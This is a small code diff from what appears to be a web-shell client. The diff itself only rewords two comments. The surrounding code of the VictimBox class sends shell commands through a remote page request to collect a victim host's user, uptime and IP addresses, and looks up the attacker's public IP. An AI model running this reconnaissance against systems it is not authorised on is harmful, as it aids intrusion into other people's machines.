@@ -15,7 +15,7 @@ class VictimBox(object):
         self.cmd += 'input=`uptime` && if [[ \'$input\' == *day* ]] ; then echo $input | awk \'{print $3 ":" $5}\' | tr -d "," | awk -F ":" \'{print $1 " days, " $2 " hours and " $3 " minutes"}\'; else echo $input | awk \'{print $3}\' | tr -d "," | awk -F ":" \'{print $1 " hours and " $2 " minutes"}\'; fi;'
         self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' ';"
 
-        # call get_page_source() method then assign it to self.source
+        # Call get_page_source() method then assign it to self.source
         source = make_request.get_page_source(self.cmd)
 
         self.current_user = source[0]
@@ -26,7 +26,7 @@ class VictimBox(object):
         self.uptime = source[5]
         self.host_ip = ', '.join(source[6:])
         try:
-            # get the attacker's ip address thx to hostess
+            # Get the attacker's ip address (thanks @mandreko)
             self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
         except URLError:
             self.local_ip = 'Unknown'
